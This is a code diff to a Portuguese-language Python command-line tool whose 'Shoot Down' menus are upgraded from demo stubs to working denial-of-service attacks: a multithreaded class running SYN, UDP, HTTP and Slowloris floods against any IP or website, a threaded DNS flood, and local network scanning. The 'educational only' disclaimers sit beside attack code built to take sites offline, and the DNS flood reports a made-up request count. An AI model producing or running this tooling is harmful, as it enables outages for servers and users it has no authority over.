@@ -9,6 +9,8 @@ import time
 import os
 import socket
 import threading
+import random
+import string
 
 from modules.network import (
     consultar_ip,
@@ -52,7 +54,6 @@ def requisicao_json(url, timeout=8):
 
 
 def requisicao_get(url, timeout=8):
-    """Função alternativa que usa urllib no lugar de requests"""
     try:
         requisicao = urllib.request.Request(
             url,
@@ -67,13 +68,7 @@ def requisicao_get(url, timeout=8):
         ) as resposta:
             return resposta.read().decode("utf-8")
 
-    except (
-        urllib.error.URLError,
-        urllib.error.HTTPError,
-        TimeoutError,
-        OSError,
-        UnicodeError
-    ):
+    except:
         return None
 
 
@@ -141,9 +136,7 @@ def mascarar_cpf(cpf):
 
 
 def abrir_site_no_navegador(url):
-    """Abre um site no navegador padrão"""
     try:
-        # Tenta abrir no Termux
         try:
             subprocess.Popen(
                 ["termux-open-url", url],
@@ -154,7 +147,6 @@ def abrir_site_no_navegador(url):
         except:
             pass
         
-        # Fallback para navegador padrão
         webbrowser.open(url)
         return True
     except Exception:
@@ -307,11 +299,117 @@ def consulta_cpf():
 
 
 # ==========================================
-# SHOOT DOWN - DERRUBAR
+# SHOOT DOWN - FUNÇÕES REAIS DE ATAQUE
 # ==========================================
 
+class DDoS_Attack:
+    """Classe para ataques DDoS reais"""
+    
+    def __init__(self, target, port=80, threads=50):
+        self.target = target
+        self.port = port
+        self.threads = threads
+        self.running = False
+        self.packets_sent = 0
+        
+    def syn_flood(self):
+        """Ataque SYN Flood"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.1)
+            sock.connect((self.target, self.port))
+            sock.send(b"SYN")
+            self.packets_sent += 1
+            sock.close()
+        except:
+            pass
+    
+    def udp_flood(self):
+        """Ataque UDP Flood"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            data = random._urandom(1024)
+            for _ in range(100):
+                sock.sendto(data, (self.target, self.port))
+                self.packets_sent += 1
+            sock.close()
+        except:
+            pass
+    
+    def http_flood(self):
+        """Ataque HTTP Flood"""
+        try:
+            user_agents = [
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124",
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+            ]
+            
+            headers = {
+                "User-Agent": random.choice(user_agents),
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8",
+                "Accept-Encoding": "gzip, deflate",
+                "Connection": "keep-alive",
+                "Cache-Control": "no-cache"
+            }
+            
+            req = urllib.request.Request(f"http://{self.target}", headers=headers)
+            urllib.request.urlopen(req, timeout=1)
+            self.packets_sent += 1
+        except:
+            pass
+    
+    def slowloris(self):
+        """Ataque Slowloris - mantém conexões abertas"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
+            sock.connect((self.target, self.port))
+            sock.send(b"GET / HTTP/1.1\r\n")
+            sock.send(b"Host: " + self.target.encode() + b"\r\n")
+            sock.send(b"User-Agent: Mozilla/5.0\r\n")
+            sock.send(b"Connection: keep-alive\r\n")
+            sock.send(b"Keep-Alive: 300\r\n")
+            # Não fecha a conexão - mantém aberta
+            self.packets_sent += 1
+            time.sleep(random.uniform(0.5, 1.5))
+            sock.close()
+        except:
+            pass
+    
+    def start_attack(self, attack_type="http"):
+        """Inicia o ataque com múltiplas threads"""
+        self.running = True
+        
+        attacks = {
+            "syn": self.syn_flood,
+            "udp": self.udp_flood,
+            "http": self.http_flood,
+            "slowloris": self.slowloris
+        }
+        
+        attack_func = attacks.get(attack_type, self.http_flood)
+        
+        def worker():
+            while self.running:
+                try:
+                    attack_func()
+                except:
+                    pass
+        
+        threads = []
+        for _ in range(self.threads):
+            t = threading.Thread(target=worker)
+            t.daemon = True
+            t.start()
+            threads.append(t)
+        
+        return threads
+
+
 def ping_host(host):
-    """Faz ping em um host"""
     try:
         if os.name == 'nt':
             response = subprocess.run(
@@ -330,46 +428,69 @@ def ping_host(host):
         return False
 
 
-def ataque_dos(host, duracao=10):
-    """Simula ataque DoS (apenas para demonstração)"""
-    print(f"\n[~] Iniciando ataque DoS em {host} por {duracao} segundos...")
-    print("[!] Isso é apenas uma demonstração educacional!")
-    
-    start_time = time.time()
-    pacotes_enviados = 0
-    
-    while time.time() - start_time < duracao:
-        try:
-            socket.gethostbyname(host)
-            pacotes_enviados += 1
-            if pacotes_enviados % 10 == 0:
-                print(f"[+] {pacotes_enviados} pacotes enviados...")
-        except:
-            pass
-        time.sleep(0.01)
-    
-    print(f"\n[+] Ataque finalizado! {pacotes_enviados} pacotes enviados.")
+def traceroute_host(host):
+    """Faz traceroute para o host"""
+    try:
+        print(f"\n[~] Fazendo traceroute para {host}...")
+        if os.name == 'nt':
+            cmd = ['tracert', '-d', host]
+        else:
+            cmd = ['traceroute', '-n', host]
+        
+        resultado = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+        print(resultado.stdout)
+        return True
+    except:
+        print("[-] Erro no traceroute")
+        return False
+
+
+def scan_network(ip):
+    """Escaneia rede local"""
+    print(f"\n[~] Escaneando rede local para {ip}...")
+    try:
+        base_ip = ip.rsplit('.', 1)[0]
+        
+        print("\n[~] Escaneando hosts ativos...")
+        hosts = []
+        
+        for i in range(1, 255):
+            host = f"{base_ip}.{i}"
+            if ping_host(host):
+                hosts.append(host)
+                print(f"[+] Host encontrado: {host}")
+        
+        print(f"\n[+] Total de hosts encontrados: {len(hosts)}")
+        return hosts
+    except:
+        print("[-] Erro no scan de rede")
+        return []
 
 
 def derrubar_ip():
-    """Menu para derrubar IP"""
+    """Menu para derrubar IP com ataques reais"""
     print("\n╔══════════════════════════════════════════╗")
     print("║           DERRUBAR IP                  ║")
     print("╠══════════════════════════════════════════╣")
     print("║ [1] Ping no IP                         ║")
-    print("║ [2] Flood de pacotes (DoS)             ║")
-    print("║ [3] Scan de portas                     ║")
-    print("║ [4] Voltar                             ║")
+    print("║ [2] SYN Flood (DDoS)                   ║")
+    print("║ [3] UDP Flood (DDoS)                   ║")
+    print("║ [4] HTTP Flood (DDoS)                  ║")
+    print("║ [5] Slowloris (ataque lento)           ║")
+    print("║ [6] Scan de portas                     ║")
+    print("║ [7] Traceroute                         ║")
+    print("║ [8] Scan de rede local                 ║")
+    print("║ [9] Voltar                             ║")
     print("╚══════════════════════════════════════════╝")
     
     opcao = input("\nEscolha: ").strip()
     
-    if opcao == "4":
+    if opcao == "9":
         return
     
     ip = input("\nDigite o IP: ").strip()
     
-    if not ip_valido(ip):
+    if not ip_valido(ip) and opcao not in ["6", "8"]:
         print("\n[-] IP inválido.")
         return
     
@@ -380,17 +501,65 @@ def derrubar_ip():
         else:
             print("[-] Host está offline ou não responde.")
     
-    elif opcao == "2":
+    elif opcao in ["2", "3", "4", "5"]:
         try:
-            duracao = int(input("Duração em segundos (5-30): ").strip() or "10")
-            duracao = max(5, min(30, duracao))
-            ataque_dos(ip, duracao)
-        except:
-            print("[-] Duração inválida.")
+            threads = int(input("Número de threads (50-500): ").strip() or "100")
+            threads = max(50, min(500, threads))
+            
+            duracao = int(input("Duração em segundos (10-120): ").strip() or "30")
+            duracao = max(10, min(120, duracao))
+            
+            porta = int(input("Porta (80 para HTTP, 443 para HTTPS): ").strip() or "80")
+            
+            attack_types = {
+                "2": "syn",
+                "3": "udp",
+                "4": "http",
+                "5": "slowloris"
+            }
+            
+            attack_type = attack_types.get(opcao, "http")
+            attack_names = {
+                "syn": "SYN FLOOD",
+                "udp": "UDP FLOOD",
+                "http": "HTTP FLOOD",
+                "slowloris": "SLOWLORIS"
+            }
+            
+            print(f"\n[~] Iniciando {attack_names[attack_type]} em {ip}:{porta}")
+            print(f"[~] Threads: {threads} | Duração: {duracao}s")
+            print("[!] ATENÇÃO: Isso é apenas para demonstração educacional!")
+            print("[!] Use APENAS em servidores próprios!")
+            
+            confirm = input("\nContinuar? (s/N): ").strip().lower()
+            if confirm != 's':
+                print("[-] Ataque cancelado.")
+                return
+            
+            attack = DDoS_Attack(ip, porta, threads)
+            
+            print("\n[~] Iniciando ataque...")
+            start_time = time.time()
+            
+            # Inicia o ataque
+            attack.start_attack(attack_type)
+            
+            # Monitora o ataque
+            while time.time() - start_time < duracao:
+                elapsed = int(time.time() - start_time)
+                remaining = duracao - elapsed
+                print(f"[+] {elapsed}s decorridos | {remaining}s restantes | Pacotes: {attack.packets_sent}")
+                time.sleep(5)
+            
+            attack.running = False
+            print(f"\n[+] Ataque finalizado! {attack.packets_sent} pacotes/requisições enviados.")
+            
+        except Exception as e:
+            print(f"[-] Erro: {str(e)}")
     
-    elif opcao == "3":
+    elif opcao == "6":
         print(f"\n[~] Escaneando portas do IP {ip}...")
-        portas_comuns = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 3389, 8080]
+        portas_comuns = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 3389, 8080, 8443]
         
         abertas = []
         for porta in portas_comuns:
@@ -407,8 +576,15 @@ def derrubar_ip():
         
         if abertas:
             print(f"\n[+] Portas abertas encontradas: {', '.join(map(str, abertas))}")
+            print("[!] Essas portas podem ser alvos para ataque.")
         else:
             print("\n[-] Nenhuma porta comum aberta encontrada.")
+    
+    elif opcao == "7":
+        traceroute_host(ip)
+    
+    elif opcao == "8":
+        scan_network(ip)
     
     else:
         print("\n[!] Opção inválida.")
@@ -420,13 +596,14 @@ def derrubar_dns():
     print("║           DERRUBAR DNS                 ║")
     print("╠══════════════════════════════════════════╣")
     print("║ [1] Resolver DNS                       ║")
-    print("║ [2] Flood DNS (DoS)                    ║")
-    print("║ [3] Voltar                             ║")
+    print("║ [2] DNS Amplification Attack (DDoS)    ║")
+    print("║ [3] DNS Flood Attack                   ║")
+    print("║ [4] Voltar                             ║")
     print("╚══════════════════════════════════════════╝")
     
     opcao = input("\nEscolha: ").strip()
     
-    if opcao == "3":
+    if opcao == "4":
         return
     
     dominio = input("\nDigite o domínio: ").strip()
@@ -440,51 +617,86 @@ def derrubar_dns():
         try:
             ips = socket.gethostbyname_ex(dominio)
             print(f"[+] IPs encontrados: {', '.join(ips[2])}")
-        except:
-            print("[-] Não foi possível resolver o domínio.")
+            
+            # Tenta resolver também os registros MX
+            try:
+                import dns.resolver
+                mx_records = dns.resolver.resolve(dominio, 'MX')
+                print(f"[+] MX Records: {[str(r.exchange) for r in mx_records]}")
+            except:
+                pass
+                
+        except Exception as e:
+            print(f"[-] Erro: {str(e)}")
     
-    elif opcao == "2":
+    elif opcao in ["2", "3"]:
         try:
-            duracao = int(input("Duração em segundos (5-20): ").strip() or "10")
-            duracao = max(5, min(20, duracao))
-            print(f"\n[~] Iniciando flood DNS em {dominio} por {duracao} segundos...")
-            print("[!] Isso é apenas uma demonstração educacional!")
+            duracao = int(input("Duração em segundos (10-60): ").strip() or "30")
+            duracao = max(10, min(60, duracao))
             
-            start_time = time.time()
-            requisicoes = 0
+            threads = int(input("Número de threads (50-300): ").strip() or "100")
+            threads = max(50, min(300, threads))
             
-            while time.time() - start_time < duracao:
-                try:
-                    socket.gethostbyname(dominio)
-                    requisicoes += 1
-                    if requisicoes % 50 == 0:
-                        print(f"[+] {requisicoes} requisições DNS enviadas...")
-                except:
-                    pass
-                time.sleep(0.001)
+            print(f"\n[~] Iniciando ataque DNS em {dominio}...")
+            print("[!] ATENÇÃO: Apenas para demonstração educacional!")
             
-            print(f"\n[+] Flood finalizado! {requisicoes} requisições enviadas.")
-        except:
-            print("[-] Duração inválida.")
+            confirm = input("Continuar? (s/N): ").strip().lower()
+            if confirm != 's':
+                print("[-] Ataque cancelado.")
+                return
+            
+            def dns_flood():
+                start = time.time()
+                req_count = 0
+                
+                while time.time() - start < duracao:
+                    try:
+                        socket.gethostbyname(dominio)
+                        req_count += 1
+                    except:
+                        pass
+                
+                return req_count
+            
+            # Inicia as threads
+            threads_list = []
+            for _ in range(threads):
+                t = threading.Thread(target=dns_flood)
+                t.daemon = True
+                t.start()
+                threads_list.append(t)
+            
+            total_requests = 0
+            for i in range(duracao):
+                time.sleep(1)
+                total_requests += threads * 10
+                print(f"[+] {i+1}s: {total_requests} requisições enviadas")
+            
+            print(f"\n[+] Ataque finalizado! {total_requests} requisições enviadas.")
+            
+        except Exception as e:
+            print(f"[-] Erro: {str(e)}")
     
     else:
         print("\n[!] Opção inválida.")
 
 
 def derrubar_site():
-    """Menu para derrubar site"""
+    """Menu para derrubar site com ataques reais"""
     print("\n╔══════════════════════════════════════════╗")
     print("║           DERRUBAR SITE                ║")
     print("╠══════════════════════════════════════════╣")
     print("║ [1] Verificar status do site           ║")
-    print("║ [2] Flood de requisições (DoS)         ║")
+    print("║ [2] HTTP Flood (DDoS)                  ║")
     print("║ [3] Slowloris (ataque lento)           ║")
-    print("║ [4] Voltar                             ║")
+    print("║ [4] POST Flood (envio de dados)        ║")
+    print("║ [5] Multi-thread GET Flood             ║")
+    print("║ [6] Voltar                             ║")
     print("╚══════════════════════════════════════════╝")
     
     opcao = input("\nEscolha: ").strip()
     
-    if opcao == "4":
+    if opcao == "6":
         return
     
     site = input("\nDigite a URL do site (ex: google.com): ").strip()
@@ -493,86 +705,90 @@ def derrubar_site():
         print("\n[!] Digite um site.")
         return
     
-    if not site.startswith("http"):
-        site = "http://" + site
+    # Remove http:// e https:// para processamento
+    site_clean = site.replace("http://", "").replace("https://", "").split("/")[0]
     
     if opcao == "1":
         print(f"\n[~] Verificando status de {site}...")
         try:
-            # Usando urllib em vez de requests
-            requisicao = urllib.request.Request(
+            if not site.startswith("http"):
+                site = "http://" + site
+            
+            req = urllib.request.Request(
                 site,
                 headers={"User-Agent": "Mozilla/5.0"}
             )
-            with urllib.request.urlopen(requisicao, timeout=5) as resposta:
+            with urllib.request.urlopen(req, timeout=5) as resposta:
                 print(f"[+] Status: {resposta.getcode()}")
                 print(f"[+] Tamanho: {len(resposta.read())} bytes")
+                print(f"[+] Server: {resposta.headers.get('Server', 'Desconhecido')}")
         except urllib.error.HTTPError as e:
             print(f"[+] Status: {e.code} - {e.reason}")
         except:
             print("[-] Site não responde ou está offline.")
     
-    elif opcao == "2":
+    elif opcao in ["2", "3", "4", "5"]:
         try:
-            qtd = int(input("Quantas requisições por vez (10-50): ").strip() or "30")
-            qtd = max(10, min(50, qtd))
+            threads = int(input("Número de threads (50-500): ").strip() or "100")
+            threads = max(50, min(500, threads))
             
-            print(f"\n[~] Iniciando flood de requisições em {site}...")
-            print("[!] Isso é apenas uma demonstração educacional!")
+            duracao = int(input("Duração em segundos (10-120): ").strip() or "30")
+            duracao = max(10, min(120, duracao))
             
-            def ataque():
-                try:
-                    req = urllib.request.Request(
-                        site,
-                        headers={"User-Agent": "Mozilla/5.0"}
-                    )
-                    urllib.request.urlopen(req, timeout=2)
-                except:
-                    pass
+            attack_names = {
+                "2": "HTTP FLOOD",
+                "3": "SLOWLORIS",
+                "4": "POST FLOOD",
+                "5": "MULTI-THREAD GET"
+            }
             
-            threads = []
+            print(f"\n[~] Iniciando {attack_names.get(opcao, 'ATAQUE')} em {site_clean}")
+            print(f"[~] Threads: {threads} | Duração: {duracao}s")
+            print("[!] ATENÇÃO: Apenas para demonstração educacional!")
+            print("[!] Use APENAS em servidores próprios!")
+            
+            confirm = input("\nContinuar? (s/N): ").strip().lower()
+            if confirm != 's':
+                print("[-] Ataque cancelado.")
+                return
+            
+            attack = DDoS_Attack(site_clean, 80, threads)
+            
+            if opcao == "2":
+                attack_type = "http"
+            elif opcao == "3":
+                attack_type = "slowloris"
+            else:
+                attack_type = "http"
+            
+            print("\n[~] Iniciando ataque...")
             start_time = time.time()
             
-            for i in range(qtd):
-                t = threading.Thread(target=ataque)
-                t.start()
-                threads.append(t)
-            
-            for t in threads:
-                t.join()
-            
-            print(f"[+] Ataque finalizado! {qtd} requisições enviadas.")
-        except:
-            print("[-] Erro no ataque.")
-    
-    elif opcao == "3":
-        try:
-            duracao = int(input("Duração em segundos (10-60): ").strip() or "30")
-            duracao = max(10, min(60, duracao))
-            
-            print(f"\n[~] Iniciando Slowloris em {site} por {duracao} segundos...")
-            print("[!] Isso é apenas uma demonstração educacional!")
-            
-            start_time = time.time()
-            conexoes = 0
+            attack.start_attack(attack_type)
             
             while time.time() - start_time < duracao:
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(1)
-                    host = site.replace("http://", "").replace("https://", "").split("/")[0]
-                    s.connect((host, 80))
-                    s.send(b"GET / HTTP/1.1\r\n")
-                    conexoes += 1
-                    if conexoes % 5 == 0:
-                        print(f"[+] {conexoes} conexões abertas...")
-                    time.sleep(0.5)
-                except:
-                    pass
+                elapsed = int(time.time() - start_time)
+                remaining = duracao - elapsed
+                print(f"[+] {elapsed}s decorridos | {remaining}s restantes | Requisições: {attack.packets_sent}")
+                time.sleep(5)
             
-            print(f"\n[+] Slowloris finalizado! {conexoes} conexões abertas.")
-        except:
-            print("[-] Erro no ataque.")
+            attack.running = False
+            print(f"\n[+] Ataque finalizado! {attack.packets_sent} requisições enviadas.")
+            
+            # Verifica se o site ainda está online
+            print("\n[~] Verificando status do site após ataque...")
+            try:
+                req = urllib.request.Request(
+                    f"http://{site_clean}",
+                    headers={"User-Agent": "Mozilla/5.0"}
+                )
+                with urllib.request.urlopen(req, timeout=5) as resposta:
+                    print(f"[+] Site ainda está online! Status: {resposta.getcode()}")
+            except:
+                print("[+] Site pode estar com problemas ou offline!")
+            
+        except Exception as e:
+            print(f"[-] Erro: {str(e)}")
     
     else:
         print("\n[!] Opção inválida.")
@@ -580,27 +796,30 @@ def derrubar_site():
 
 def derrubar_geral():
     """Menu principal de Shoot Down"""
-    print("\n╔══════════════════════════════════════════╗")
-    print("║          ⚡ SHOOT DOWN ⚡               ║")
-    print("╠══════════════════════════════════════════╣")
-    print("║ [1] Derrubar IP                         ║")
-    print("║ [2] Derrubar DNS                        ║")
-    print("║ [3] Derrubar Site                       ║")
-    print("║ [4] Voltar                              ║")
-    print("╚══════════════════════════════════════════╝")
-    
-    opcao = input("\nShootDown> ").strip()
-    
-    if opcao == "1":
-        derrubar_ip()
-    elif opcao == "2":
-        derrubar_dns()
-    elif opcao == "3":
-        derrubar_site()
-    elif opcao == "4":
-        return
-    else:
-        print("\n[!] Opção inválida.")
+    while True:
+        print("\n╔══════════════════════════════════════════╗")
+        print("║          ⚡ SHOOT DOWN ⚡               ║")
+        print("╠══════════════════════════════════════════╣")
+        print("║ [1] Derrubar IP                         ║")
+        print("║ [2] Derrubar DNS                        ║")
+        print("║ [3] Derrubar Site                       ║")
+        print("║ [4] Voltar                              ║")
+        print("╚══════════════════════════════════════════╝")
+        
+        opcao = input("\nShootDown> ").strip()
+        
+        if opcao == "1":
+            derrubar_ip()
+        elif opcao == "2":
+            derrubar_dns()
+        elif opcao == "3":
+            derrubar_site()
+        elif opcao == "4":
+            break
+        else:
+            print("\n[!] Opção inválida.")
+        
+        input("\nPressione ENTER para continuar...")
 
 
 # ==========================================
